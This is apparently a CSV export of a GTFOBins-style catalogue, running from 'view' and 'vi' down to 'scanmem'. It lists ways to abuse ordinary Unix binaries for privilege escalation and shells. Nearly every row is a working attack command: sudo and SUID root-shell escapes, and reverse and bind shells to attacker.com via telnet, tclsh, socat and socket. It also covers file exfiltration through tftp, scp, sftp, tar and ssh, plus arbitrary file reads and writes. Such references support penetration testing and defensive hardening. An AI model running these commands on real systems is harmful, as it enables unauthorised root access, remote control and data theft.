s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"") vim.command("":q!"")'","","Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.","export LPORT=12345 view -c ':lua local k=require(""socket"");   local s=assert(k.bind(""*"",os.getenv(""LPORT"")));   local c=s:accept();   while true do     local r,x=c:receive();local f=assert(io.popen(r,""r""));     local b=assert(f:read(""*a""));c:send(b);   end;c:close();f:close();'","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.","view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(""lib.so""); vim.command("":q!"")'","","This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.","./view -c ':py import os; os.setuid(0); os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","This requires that `view` is compiled with Lua support.","","","","false"
"vi","","","[''vi -c ':!/bin/sh' /dev/null''-|-''vi :set shell=/bin/sh :shell '']","","","sudo vi -c ':!/bin/sh' /dev/null","Modern Unix systems run [`vim`](/gtfobins/vim/) binary when `vi` is called.","","vi file_to_read","","","","vi file_to_write iDATA ^[ w","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"varnishncsa","","","","","","LFILE=file_to_write sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start `varnishncsa` as follows, then trigger the file write with:  ``` curl -H 'yyy: DATA' http://localhost:6081/xxx ```","","","","LFILE=file_to_write ./varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"valgrind","","","valgrind /bin/sh","","","sudo valgrind /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"vagrant","","","cd $(mktemp -d) echo 'exec ""/bin/sh""' > Vagrantfile vagrant up","","","cd $(mktemp -d) echo 'exec ""/bin/sh""' > Vagrantfile vagrant up","This allows to execute [`ruby`](/gtfobins/ruby/) code, other functions may apply.","","","","cd $(mktemp -d) echo 'exec ""/bin/sh -p""' > Vagrantfile vagrant up","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"uuencode","","","","","","LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode","","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"uudecode","","","","","","LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode","","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","LFILE=file_to_read uuencode ""$LFILE"" /dev/stdout | uudecode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"update-alternatives","","","","","Write in `$LFILE` a symlink to `$TF`.","LFILE=/path/to/file_to_write TF=$(mktemp) echo DATA >$TF sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","","","","","LFILE=/path/to/file_to_write TF=$(mktemp) echo DATA >$TF ./update-alternatives --force --install ""$LFILE"" x ""$TF"" 0","","","","","","","","","Write in `$LFILE` a symlink to `$TF`.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unzip","","","","","","sudo unzip -K shell.zip ./sh -p","Certain `unzip` versions allows to preserve the SUID bit. Prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh zip shell.zip sh ```  Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).","","","","./unzip -K shell.zip ./sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unsquashfs","","","","","","sudo unsquashfs shell ./squashfs-root/sh -p","`unsquashfs` preserve the SUID bit when extracting the file system. Prepare an archive beforehand with the following commands as root:  ``` cp /bin/sh . chmod +s sh mksquashfs sh shell ```  Extract it on the target, then run the SUID shell as usual (omitting the `-p` where appropriate).","","","","./unsquashfs shell ./squashfs-root/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unshare","","","unshare /bin/sh","","","sudo unshare /bin/sh","","","","","./unshare -r /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"uniq","","","","","","LFILE=file_to_read sudo uniq ""$LFILE""","The read file content is corrupted by squashing multiple adjacent lines.","","LFILE=file_to_read uniq ""$LFILE""","","LFILE=file_to_read ./uniq ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"unexpand","","","","","","LFILE=file_to_read sudo unexpand -t99999999 ""$LFILE""","","","LFILE=file_to_read unexpand -t99999999 ""$LFILE""","","LFILE=file_to_read ./unexpand -t99999999 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ul","","","","","","LFILE=file_to_read sudo ul ""$LFILE""","The read file content is corrupted by replacing occurrences of `$'\b_'` to terminal sequences and by converting tabs to spaces.","","LFILE=file_to_read ul ""$LFILE""","","LFILE=file_to_read ./ul ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tshark","","","TF=$(mktemp) echo 'os.execute(""/bin/sh"")' >$TF tshark -Xlua_script:$TF","","","","This program is able to execute [`lua`](/gtfobins/less/) code.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"troff","","","","","","LFILE=file_to_read sudo troff $LFILE","The file is typeset but text is still readable in the output, alternatively the output can be read with `man -l`.","","LFILE=file_to_read troff $LFILE","","LFILE=file_to_read ./troff $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"torsocks","","","torsocks /bin/sh","","","sudo torsocks /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"torify","","","torify /bin/sh","","","sudo torify /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"top","","","echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc top # press return twice reset","","This requires that the root configuration file is writable and might be used to persist elevated privileges.","echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc sudo top # press return twice reset","This requires that an existing configuration file is present, to create one run `top` then type `Wq`. Note down the actual configuration file path and use it in the below examples.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tmux","","Provided to have enough permissions to access the socket.","[''tmux''-|-''tmux -S /path/to/socket_name '']","","","sudo tmux","","","LFILE=file_to_read tmux -f $LFILE","","","","","","","","","","The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tmate","","","tmate -c /bin/sh","","","sudo tmate -c /bin/sh","","","","","","","","","./tmate -c /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"timeout","","","timeout 7d /bin/sh","","","sudo timeout --foreground 7d /bin/sh","","","","","./timeout 7d /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"timedatectl","","","timedatectl list-timezones !/bin/sh","","","sudo timedatectl list-timezones !/bin/sh","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.  This might not work if run by unprivileged users depending on the system configuration.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"time","","","/usr/bin/time /bin/sh","","","sudo /usr/bin/time /bin/sh","Note that the shell might have its own builtin time implementation, which may behave differently than` /usr/bin/time`, hence the absolute path.","","","","./time /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tic","","","","","","LFILE=file_to_read sudo tic -C ""$LFILE""","The tic command translates a terminfo file from source format into compiled format. It will attempt to translate an arbitrary file and output the contents of the file on failure, so this may not be suitable to read arbitrary binary data.","","LFILE=file_to_read tic -C ""$LFILE""","","LFILE=file_to_read ./tic -C ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tftp","","","","","Send local file to a TFTP server.","RHOST=attacker.com sudo tftp $RHOST put file_to_send","","","","","RHOST=attacker.com ./tftp $RHOST put file_to_send","","","","","","Fetch a remote file from a TFTP server.","RHOST=attacker.com tftp $RHOST get file_to_get","","Send local file to a TFTP server.","","","","","","","","Send local file to a TFTP server.","RHOST=attacker.com tftp $RHOST put file_to_send","","","","","","","","","","","","","","","","","","false"
"tex","","","tex --shell-escape '\write18{/bin/sh}\end'","","","sudo tex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","./tex --shell-escape '\write18{/bin/sh}\end'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"terraform","","","","","","sudo terraform console file(""file_to_read"")","","","terraform console file(""file_to_read"")","","./terraform console file(""file_to_read"")","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"telnet","","BSD version only. Needs to be connected first.","RHOST=attacker.com RPORT=12345 telnet $RHOST $RPORT ^] !/bin/sh","","BSD version only. Needs to be connected first.","RHOST=attacker.com RPORT=12345 sudo telnet $RHOST $RPORT ^] !/bin/sh","","","","","","","","","RHOST=attacker.com RPORT=12345 ./telnet $RHOST $RPORT ^] !/bin/sh","","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 TF=$(mktemp -u) mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF","","","","","","","","","","BSD version only. Needs to be connected first.","","","","false"
"tee","","","","","","LFILE=file_to_write echo DATA | sudo tee -a ""$LFILE""","It can only append data if the destination exists.","","","","LFILE=file_to_write echo DATA | ./tee -a ""$LFILE""","","LFILE=file_to_write echo DATA | ./tee -a ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tdbtool","","","tdbtool ! /bin/sh","","","sudo tdbtool ! /bin/sh","","","","","","","","","./tdbtool ! /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tcpdump","","","","","","COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root","These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.  In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.","","","","","","","","","","","","","","","","","","","COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF","","","","","","","","","","","","","","","","","","","","","false"
"tclsh","","","tclsh exec /bin/sh <@stdin >@stdout 2>@stderr","","","sudo tclsh exec /bin/sh <@stdin >@stdout 2>@stderr","","","","","./tclsh exec /bin/sh -p <@stdin >@stdout 2>@stderr","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh","","","","","","","","","","","","","","","","","","","","","","","","false"
"tbl","","","","","","LFILE=file_to_read sudo tbl $LFILE","The read file content is corrupted by additional text at the beginning.","","LFILE=file_to_read tbl $LFILE","","LFILE=file_to_read ./tbl $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tasksh","","","tasksh !/bin/sh","","","sudo tasksh !/bin/sh","","","","","","","","","./tasksh !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"taskset","","","taskset 1 /bin/sh","","","sudo taskset 1 /bin/sh","","","","","./taskset 1 /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"task","","","task execute /bin/sh","","","sudo task execute /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tar","","[''This only works for GNU tar.''-|-''This only works for GNU tar. It can be useful when only a limited command argument injection is available.'']","[''tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh''-|-''tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'''-|-''TF=$(mktemp) echo '/bin/sh 0<&1' > ""$TF"" tar cf ""$TF.tar"" ""$TF"" tar xf ""$TF.tar"" --to-command sh rm ""$TF""* '']","","","sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh","","","LFILE=file_to_read tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'","","","","LFILE=file_to_write TF=$(mktemp) echo DATA > ""$TF"" tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P","","./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh","","This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).","RHOST=attacker.com RUSER=root RFILE=/tmp/file_to_get.tar tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh","This only works for GNU tar.","","","","","","","","","This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).","RHOST=attacker.com RUSER=root RFILE=/tmp/file_to_send.tar LFILE=file_to_send tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh","This only works for GNU tar.","","","","","","","","","","","","","","","","","false"
"tail","","","","","","LFILE=file_to_read sudo tail -c1G ""$LFILE""","","","LFILE=file_to_read tail -c1G ""$LFILE""","","LFILE=file_to_read ./tail -c1G ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"tac","","","","","","LFILE=file_to_read sudo tac -s 'RANDOM' ""$LFILE""","Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.","","LFILE=file_to_read tac -s 'RANDOM' ""$LFILE""","","LFILE=file_to_read ./tac -s 'RANDOM' ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"systemd-resolve","","","","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo systemd-resolve --status !sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"systemctl","","","","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","[''TF=$(mktemp) echo /bin/sh >$TF chmod +x $TF sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice ''-|-''TF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=/bin/sh -c ""id > /tmp/output"" [Install] WantedBy=multi-user.target' > $TF sudo systemctl link $TF sudo systemctl enable --now $TF ''-|-''sudo systemctl !sh'']","","","","","TF=$(mktemp).service echo '[Service] Type=oneshot ExecStart=/bin/sh -c ""id > /tmp/output"" [Install] WantedBy=multi-user.target' > $TF ./systemctl link $TF ./systemctl enable --now $TF","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sysctl","","","","","","COMMAND='/bin/sh -c id>/tmp/id' sudo sysctl ""kernel.core_pattern=|$COMMAND"" sleep 9999 & kill -QUIT $! cat /tmp/id","","","LFILE=file_to_read /usr/sbin/sysctl -n ""/../../$LFILE""","","COMMAND='/bin/sh -c id>/tmp/id' ./sysctl ""kernel.core_pattern=|$COMMAND"" sleep 9999 & kill -QUIT $! cat /tmp/id","","","","","","","","The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.","","","","","","The command is executed by root in the background when a core dump occurs.","COMMAND='/bin/sh -c id>/tmp/id' sysctl ""kernel.core_pattern=|$COMMAND"" sleep 9999 & kill -QUIT $! cat /tmp/id","","","","","","","","","","","","","","","","","","","","","false"
"sudo","","","","","","sudo sudo /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"su","","","","","","sudo su","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"strings","","","","","","LFILE=file_to_read sudo strings ""$LFILE""","This only returns ASCII strings, thus it is not suitable for binary files.","","LFILE=file_to_read strings ""$LFILE""","","LFILE=file_to_read ./strings ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"strace","","","strace -o /dev/null /bin/sh","","","sudo strace -o /dev/null /bin/sh","","","","","./strace -o /dev/null /bin/sh -p","","LFILE=file_to_write strace -s 999 -o $LFILE strace - DATA","","","","","","","","","","","","","","","","","The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.","","","","","","","","","","","","","","","","","false"
"stdbuf","","","stdbuf -i0 /bin/sh","","","sudo stdbuf -i0 /bin/sh","","","","","./stdbuf -i0 /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"start-stop-daemon","","","start-stop-daemon -n $RANDOM -S -x /bin/sh","","","sudo start-stop-daemon -n $RANDOM -S -x /bin/sh","","","","","./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sshpass","","","sshpass /bin/sh","","","sudo sshpass /bin/sh","","","","","./sshpass /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ssh","","[''Reconnecting may help bypassing restricted shells.''-|-''Spawn interactive shell through ProxyCommand option.''-|-''Spawn interactive shell on client, requires a successful connection towards `host`.'']","[''ssh localhost $SHELL --noprofile --norc''-|-''ssh -o ProxyCommand=';sh 0<&2 1>&2' x''-|-''ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host'']","","Spawn interactive root shell through ProxyCommand option.","sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x","","","LFILE=file_to_read ssh -F $LFILE localhost","","","","","","","","Fetch a remote file from a SSH server.","HOST=user@attacker.com RPATH=file_to_get LPATH=file_to_save ssh $HOST ""cat $RPATH"" > $LPATH","The read file content is corrupted by error prints.","","","","","","","","","Send local file to a SSH server.","HOST=user@attacker.com RPATH=file_to_save LPATH=file_to_send ssh $HOST ""cat > $RPATH"" < $LPATH","","","","","","","","","","","","","","","","","","false"
"ssh-keyscan","","","","","","LFILE=file_to_read sudo ssh-keyscan -f $LFILE","The file content is actually parsed so only a part of each line is returned as a part of an error message.","","LFILE=file_to_read ssh-keyscan -f $LFILE","","LFILE=file_to_read ./ssh-keyscan -f $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ssh-keygen","","","","","","sudo ssh-keygen -D ./lib.so","","","","","./ssh-keygen -D ./lib.so","","","","","","","","","","","","","","","","","","","","","","","","","","","","ssh-keygen -D ./lib.so","","","","","","","","false"
"ssh-agent","","","ssh-agent /bin/sh","","","sudo ssh-agent /bin/","","","","","./ssh-agent /bin/ -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ss","","","","","","LFILE=file_to_read sudo ss -a -F $LFILE","The file content is actually parsed so only a part of the first line is returned as a part of an error message.","","LFILE=file_to_read ss -a -F $LFILE","","LFILE=file_to_read ./ss -a -F $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sqlmap","","","sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","","","sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')""","This allows to execute [`python`](/gtfobins/python/) code, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sqlite3","","","sqlite3 /dev/null '.shell /bin/sh'","","","sudo sqlite3 /dev/null '.shell /bin/sh'","","","LFILE=file_to_read sqlite3 << EOF CREATE TABLE t(line TEXT); .import $LFILE t SELECT * FROM t; EOF","","LFILE=file_to_read sqlite3 << EOF CREATE TABLE t(line TEXT); .import $LFILE t SELECT * FROM t; EOF","","LFILE=file_to_write sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'","","./sqlite3 /dev/null '.shell /bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"split","","The shell prompt is not printed.","split --filter=/bin/sh /dev/stdin","","The shell prompt is not printed.","sudo split --filter=/bin/sh /dev/stdin","","","LFILE=file_to_read TF=$(mktemp) split $LFILE $TF cat $TF*","","","","[''TF=$(mktemp) echo DATA >$TF split -b999m $TF ''-|-''EXT=.xxx TF=$(mktemp) echo DATA >$TF split -b999m --additional-suffix $EXTENSION $TF '']","","","","","","","","","","","","[''Command execution using an existing or newly created file.''-|-''Command execution using stdin (and close it directly).'']","[''COMMAND=id TF=$(mktemp) split --filter=$COMMAND $TF ''-|-''COMMAND=id echo | split --filter=$COMMAND /dev/stdin '']","","","","[''Data will be written in the current directory in a file named `xaa` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.''-|-''GNU version only. Data will be written in the current directory in a file named `xaa.xxx` by default. The input file will be split in multiple smaller files unless the `-b` option is used, pick a value in MB big enough.'']","","","","","","","","","","","","","","","","","false"
"sort","","","","","","LFILE=file_to_read sudo sort -m ""$LFILE""","","","LFILE=file_to_read sort -m ""$LFILE""","","LFILE=file_to_read ./sort -m ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"softlimit","","","softlimit /bin/sh","","","sudo softlimit /bin/sh","","","","","./softlimit /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"soelim","","","","","","LFILE=file_to_read sudo soelim ""$LFILE""","The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.","","LFILE=file_to_read soelim ""$LFILE""","","LFILE=file_to_read ./soelim ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"socket","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 socket -qvp '/bin/sh -i' $RHOST $RPORT","","","","","","","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","LPORT=12345 socket -svp '/bin/sh -i' $LPORT","false"
"socat","","The resulting shell is not a proper TTY shell and lacks the prompt.","socat stdin exec:/bin/sh","","The resulting shell is not a proper TTY shell and lacks the prompt.","sudo socat stdin exec:/bin/sh","","","LFILE=file_to_read socat -u ""file:$LFILE"" -","","","","LFILE=file_to_write socat -u 'exec:echo DATA' ""open:$LFILE,creat""","","RHOST=attacker.com RPORT=12345 ./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","","Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.","RHOST=attacker.com RPORT=12345 LFILE=file_to_save socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat","","","","","","","","","","Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.","RHOST=attacker.com RPORT=12345 LFILE=file_to_send socat -u file:$LFILE tcp-connect:$RHOST:$RPORT","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane","","","","","","","","","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","","Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.","LPORT=12345 socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane","false"
"snap","","","","","It runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` COMMAND=id cd $(mktemp -d) mkdir -p meta/hooks printf '#!/bin/sh\n%s; false' ""$COMMAND"" >meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta ```","sudo snap install xxxx_1.0_all.snap --dangerous --devmode","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"smbclient","","","smbclient '\\attacker\share' !/bin/sh","","","sudo smbclient '\\attacker\share' !/bin/sh","A valid SMB/CIFS server must be available.","","","","","","","","","","Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to send the file.","smbclient '\\attacker\share' -c 'put file_to_send where_to_save'","","","","","","","","","","Install [Impacket](https://github.com/SecureAuthCorp/impacket) and run `sudo smbserver.py share /tmp` on the attacker box to collect the file.","smbclient '\\attacker\share' -c 'put file_to_send where_to_save'","","","","","","","","","","","","","","","","","","false"
"slsh","","","slsh -e 'system(""/bin/sh"")'","","","sudo slsh -e 'system(""/bin/sh"")'","","","","","","","","","./slsh -e 'system(""/bin/sh"")'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"shuf","","","","","The written file content is corrupted by adding a newline.","LFILE=file_to_write sudo shuf -e DATA -o ""$LFILE""","","","LFILE=file_to_read shuf -z ""$LFILE""","","LFILE=file_to_write ./shuf -e DATA -o ""$LFILE""","","LFILE=file_to_write shuf -e DATA -o ""$LFILE""","","","","","","The read file content is corrupted by randomizing the order of NUL terminated strings.","The written file content is corrupted by adding a newline.","","","","","","","","","","The written file content is corrupted by adding a newline.","","","","","","","","","","","","","","","","","false"
"sg","","Commands can be run if the current user's group is specified, therefore no additional permissions are needed.","sg $(id -ng)","","","sudo sg root","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sftp","","","HOST=user@attacker.com sftp $HOST !/bin/sh","","","HOST=user@attacker.com sudo sftp $HOST !/bin/sh","","","","","","","","","","","Fetch a remote file from a SSH server.","RHOST=user@attacker.com sftp $RHOST get file_to_get file_to_save","","","","","","","","","","Send local file to a SSH server.","RHOST=user@attacker.com sftp $RHOST put file_to_send file_to_save","","","","","","","","","","","","","","","","","","false"
"setlock","","","TF=$(mktemp) setlock $TF /bin/sh","","","sudo setlock - /bin/sh","","","","","./setlock - /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"setfacl","","","","","","LFILE=file_to_change USER=somebody sudo setfacl -m -u:$USER:rwx $LFILE","This can be run with elevated privileges to change ownership and then read, write, or execute a file.","","","","LFILE=file_to_change USER=somebody ./setfacl -m u:$USER:rwx $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"setarch","","","setarch $(arch) /bin/sh","","","sudo setarch $(arch) /bin/sh","The `uname -m` command can be used in place of `arch` to obtain the architecture.","","","","./setarch $(arch) /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"service","","","/usr/sbin/service ../../bin/sh","","","sudo service ../../bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"sed","","[''GNU version only. Also, this requires `bash`.''-|-''GNU version only. The resulting shell is not a proper TTY shell.'']","[''sed -n '1e exec sh 1>&0' /etc/hosts''-|-''sed e'']","","GNU version only. Also, this requires `bash`.","sudo sed -n '1e exec sh 1>&0' /etc/hosts","","","LFILE=file_to_read sed '' ""$LFILE""","","LFILE=file_to_read ./sed -e '' ""$LFILE""","","LFILE=file_to_write sed -n ""1s/.*/DATA/w $LFILE"" /etc/hosts","","","","","","","","","","","","GNU version only.","sed -n '1e id' /etc/hosts","","","","","","","","","","","","","","","","","","","","","false"
"scrot","","","scrot -e /bin/sh","","","sudo scrot -e /bin/sh","This requires a running X server.","","","","","","","","./scrot -e /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"script","","","script -q /dev/null","","","sudo script -q /dev/null","","","","","","","script -q -c 'echo DATA' file_to_write","","","","","","","","","","","","","","","","","The wrote content is corrupted by debug prints.","","","","","","","","","","","","","","","","","false"
"screen","","","screen","","","sudo screen","","","","","","","[''LFILE=file_to_write screen -L -Logfile $LFILE echo DATA ''-|-''LFILE=file_to_write screen -L $LFILE echo DATA '']","","","","","","","","","","","","","","","","","[''This works on screen version 4.06.02. Data is appended to the file and `\n` is converted to `\r\n`.''-|-''This works on screen version 4.05.00. Data is appended to the file and `\n` is converted to `\r\n`.'']","","","","","","","","","","","","","","","","","false"
"scp","","","TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" scp -S $TF x y:","","","TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" sudo scp -S $TF x y:","","","","","","","","","TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" ./scp -S $TF a b:","","Fetch a remote file from a SSH server.","RPATH=user@attacker.com:~/file_to_get LFILE=file_to_save scp $RPATH $LFILE","","","","","","","","","","Send local file to a SSH server.","RPATH=user@attacker.com:~/file_to_save LPATH=file_to_send scp $LFILE $RPATH","","","","","","","","","","","","","","","","","","false"
"scanmem","","","scanmem shell /bin/sh","","","sudo scanmem shell /bin/sh","","","","","./scanmem shell /bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
